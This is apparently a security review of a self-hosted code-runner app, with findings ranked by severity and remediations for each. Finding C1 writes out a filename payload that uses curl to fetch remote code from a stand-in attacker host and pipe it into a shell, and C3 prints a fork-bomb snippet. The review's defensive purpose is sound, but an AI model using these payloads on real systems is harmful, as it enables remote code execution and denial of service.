# Security Review — CodeVault

Reviewed as if publicly exposed. All vulnerabilities are reachable from the network with no prior access.

---

## Summary

**Posture: Poor for internet exposure. Acceptable only behind strong network isolation.**

The app runs arbitrary user-supplied code with no sandbox, no auth, and no rate limiting. The critical command injection bug means an attacker doesn't even need to submit valid code — they can achieve RCE at the *create-snippet* step before any code runs. The entire attack surface assumes Tailscale ACLs are the sole defense; if that perimeter is ever broken (misconfigured ACL, compromised device, DNS rebinding), the container is fully owned.

---

## Critical

### C1 — Command Injection via Unvalidated Filenames in `meta.json`

**Location:** `server/routes.js:48` (write), `routes.js:95` (read), `server/languages.js:29`

**Vulnerability:** On create (`POST /api/snippets`), all submitted filenames are stored in `meta.json` regardless of whether they pass `validFilename`:

```js
// line 48 — ALL names stored (no validation)
files: files.map(f => f.name)

// line 51 — only valid names get written to disk
await Promise.all(files.filter(f => validFilename(f.name)).map(...))
```

On run (`POST /api/snippets/:id/run`), `meta.files` is read back without re-validating and fed directly into `exec()` via shell interpolation in the compile command string:

```js
srcFiles = meta.files.filter(f => f.endsWith(lang.ext)).map(f => path.join(snippetDir, f))
// → srcFiles[0] = "/app/data/<uuid>/$(id).cpp"

exec(`g++ ${files.join(' ')} -o ${bin}`, ...)
// shell receives: g++ /app/data/<uuid>/$(id).cpp -o /tmp/...
// shell expands $(id) and executes it
```

**Attack scenario:**
1. `POST /api/snippets` with `files: [{ name: "$(curl http://attacker.com/s|sh).cpp", content: "" }]` — returns a valid snippet ID.
2. `POST /api/snippets/:id/run` — server builds compile command containing the shell payload, `exec()` executes it as the container user.

Full RCE in two unauthenticated requests. Affects C and C++ only (Python uses `spawn`, no shell).

**Remediation:** Re-validate every filename read from `meta.json` before using it in a path that reaches `exec()`. Simpler fix: switch the compile step from `exec()` to `spawn(compiler, [...srcFiles, '-o', outBin])` — no shell, no interpolation, no injection surface regardless of filename content.

---

### C2 — No Authentication or Authorization

**Location:** `server/index.js:16` — all `/api/*` routes, no middleware

**Vulnerability:** Every endpoint (list, read, create, update, delete, run) is open to any network peer. There is no session, token, or IP allowlist at the application layer.

**Attack scenario:** Any host on the Tailscale network (or the internet if Tailscale serve is misconfigured) can enumerate all snippets, delete them, or execute code in the container.

**Remediation:** Add a static bearer token in an env var and check it in middleware. For a personal tool this is sufficient: `Authorization: Bearer <token>` checked before any route handler runs.

---

### C3 — Unsandboxed Arbitrary Code Execution

**Location:** `server/routes.js:100–129` (snippet run), `routes.js:147–181` (playground run)

**Vulnerability:** User-submitted C++, C, and Python code is compiled and executed with no sandboxing:
- No `chroot` / `seccomp` / Linux namespace isolation
- No `ulimit` on CPU, memory, open files, or number of processes
- Full network access (compiled code can open sockets, call `system("curl ...")`)
- Full filesystem read access (code can open `/app/data/`, `/etc/passwd`, etc.)
- No restriction on spawning child processes

The 10-second timeout calls `child.kill()` (SIGTERM to the direct child). Forked children survive:

```cpp
// playground input that survives the timeout
#include <unistd.h>
int main() { while(fork()){} }  // fork bomb — parent exits, children orphaned
```

**Remediation:** Run compiled binaries inside a restricted environment:
- `bubblewrap` or `unshare` with `--net` (no network), `--ro-bind /` (read-only root), private `/tmp`
- `ulimit -v 131072 -t 5 -u 32` (128 MB virtual, 5 CPU-seconds, 32 processes) before exec
- Use `SIGKILL` to the entire process group (`child.kill('SIGKILL')` then `process.kill(-child.pid, 'SIGKILL')`) on timeout

---

## High

### H1 — Fork Bomb / Process Group Escape on Timeout

**Location:** `routes.js:110–113`, `routes.js:157–161`

**Vulnerability:** `child.kill()` sends SIGTERM to the spawned process only. If the program calls `fork()`, child processes are reparented to PID 1 (inside Docker) and survive. A deliberate fork bomb will exhaust container PIDs and OOM the host if Docker has no PID limit.

**Remediation:** Spawn with `detached: false` is the default, but that doesn't help with grandchildren. Use `spawn(..., { detached: true })` so the child leads a process group, then `process.kill(-child.pid, 'SIGKILL')` on timeout to kill the entire group.

---

### H2 — No Rate Limiting

**Location:** `server/index.js` — no middleware; `routes.js:132` (`/playground/run`), `routes.js:84` (`/snippets/:id/run`)

**Vulnerability:** `/playground/run` starts a full compile + exec cycle on every request with no throttle. An attacker (or bug in a client) can fire hundreds of concurrent requests, each pinning a gcc process for up to 15 seconds.

**Remediation:** Add `express-rate-limit` on the `/api/*/run` routes. A limit of ~10 req/min per IP is sufficient for a personal tool.

---

### H3 — Memory and Disk Exhaustion

**Location:** `routes.js:107`, `routes.js:154`; `server/index.js:14`

**Vulnerability:**
- No `ulimit -v` — a single `new int[1<<30]` call can OOM the container, killing the Node process with it.
- No limit on number of snippets or total data size. The 10 MB body limit caps one request but an attacker can POST thousands of max-size snippets, filling the host bind-mount (`./data`).
- Playground creates files in `/tmp` with no quota.

**Remediation:** Add `ulimit -v` before exec (see C3). For disk: add a snippet count or total-size check before creating. For the body limit: 10 MB is generous for code snippets; 128 KB is more appropriate.

---

## Medium

### M1 — Compile Errors Expose Internal Paths (Snippet Run)

**Location:** `routes.js:124`

**Vulnerability:** The playground sanitizes compiler stderr (`routes.js:174`). The snippet run endpoint does not:

```js
// playground — sanitized
const cleaned = stderr.replace(/\/tmp\/playground-[^/]+\/[^:]+/g, lang.srcFile)

// snippet run — raw stderr returned
if (err) return res.json({ stdout: '', stderr, exitCode: 1 })
```

`stderr` from `g++` includes full paths like `/app/data/<uuid>/file.cpp:3: error:...`, revealing the data directory layout and snippet UUID.

**Remediation:** Apply the same `replace()` sanitization to snippet-run compile errors, stripping the leading path down to just the filename.

---

### M2 — `exec()` with Shell for Compilation

**Location:** `server/languages.js:29,34`; `routes.js:123,171`

**Vulnerability:** `exec(lang.compile(...))` passes the compile command to `/bin/sh -c`. Even with current input validation this is an unnecessary shell injection surface. Any future change to how filenames or paths are constructed could silently re-open C1.

**Remediation:** Replace `exec()` with `spawn()`:

```js
// languages.js — return array instead of string
compile: (files, bin) => ['g++', ...files, '-o', bin],

// routes.js — use spawn
const [compiler, ...compileArgs] = lang.compile(srcFiles, outBin)
const compileChild = spawn(compiler, compileArgs)
```

No shell, no interpolation, no injection surface by construction.

---

### M3 — No `stdin` Size Limit

**Location:** `routes.js:107`, `routes.js:154`

**Vulnerability:** `stdin` from the request body is written directly to the child's stdin pipe with no truncation. A 10 MB stdin string (within the body limit) gets buffered into the child's stdin pipe, potentially OOMing the process or causing it to hang reading.

**Remediation:** Cap `stdin` at a reasonable size (e.g., 64 KB) in the route handler before piping.

---

### M4 — `tags` Array Has No Element-Level Validation

**Location:** `routes.js:48`

**Vulnerability:** `tags` is accepted as an arbitrary array with no element count limit, no per-element length limit, and no type check. `tags: [Array(10000).fill("x".repeat(10000))]` within the 10 MB body limit writes a large `meta.json` and causes `listSnippets` to deserialize it on every poll.

**Remediation:** Validate: max 20 tags, each ≤ 50 characters, string type enforced.

---

## Low

### L1 — `validFilename` Allows Dot-Prefix Names

**Location:** `routes.js:9`

**Vulnerability:** `/^[a-zA-Z0-9_.-]+$/` allows filenames like `.env`, `.bashrc`. These are written inside a UUID-namespaced directory, so practical impact is nil, but it violates the principle of least surprise.

**Remediation:** Require the name to start with `[a-zA-Z0-9]`.

---

### L2 — Orphaned Binary on SIGKILL

**Location:** `routes.js:117`

**Vulnerability:** `fs.unlink(outBin)` runs in the `close` event handler. If the process is SIGKILLed externally or the Node process crashes, the compiled binary is left in `/tmp`. Accumulation is bounded by UUID uniqueness but is still untidy.

**Remediation:** Already handled for normal paths. Add cleanup in the timeout handler as well (see how playground does it on lines 159–160).

---

### L3 — No CSRF Protection

**Location:** All mutating endpoints

**Vulnerability:** If a user's browser visits a malicious page while authenticated to the app on the same network, the page can make cross-origin requests to `https://cachyos-nvme.tail5500ce.ts.net/api/snippets/<id>` (DELETE, run). Browsers send cookies/credentials automatically; since there are no cookies here, this is low risk today — but becomes a real vector if auth is ever added via cookie.

**Remediation:** When adding auth (C2), use `Authorization: Bearer` header (not cookies) — fetch from a cross-origin attacker page cannot set custom headers without CORS preflight, which the server can reject.

---

### L4 — Server Listens on `0.0.0.0`

**Location:** `server/index.js:30`

**Vulnerability:** Inside Docker the listen address doesn't matter (Docker NAT handles it), but on a host that runs Node directly, `0.0.0.0` exposes the port on all interfaces.

**Remediation:** Not urgent for Docker-only use, but `127.0.0.1` is safer as a default when not in a container.

---

## Dependency Audit

`npm audit` returned **0 vulnerabilities**. All direct dependencies are current as of the review date.
